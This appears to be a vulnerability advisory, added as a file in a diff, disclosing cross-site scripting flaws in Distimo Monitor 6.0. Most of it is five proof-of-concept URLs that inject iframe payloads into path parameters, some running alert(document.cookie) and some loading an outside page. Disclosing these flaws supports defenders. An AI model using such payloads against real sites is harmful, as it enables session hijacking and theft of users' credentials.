@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/54757/info
+
+Distimo Monitor is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Distimo Monitor 6.0 is vulnerable; other versions may also be affected. 
+
+https://www.example.com/downloads/date/metric:1/country:29/application:%22%3E%3Ciframe%20src=a%20onload=alert%28document.cookie%29%20%3C/appstore:1
+https://www.example.com/downloads/date/metric:1/country:%22%3E%3Ciframe%20src=a%20onload=alert%28document.cookie%29%20%3C/application:99/appstore:1
+https://www.example.com/downloads/map/metric:%3E%22%3Ciframe%20src=http://www.example1.com%3E+%3E%22%3Ciframe%20src=http://www.example1.com%3E
+https://www.example.com/revenue/date/application:99/country:%3E%22%3Ciframe%20src=http://www.example1.com%3E%3E%22%3Ciframe%20src=http://www.example1.com%3E
+https://www.example.com/revenue/date/application:%3E%22%3Ciframe%20src=http://www.example1.com%3E%3E%22%3Ciframe%20src=http://www.example1.com/country:30 
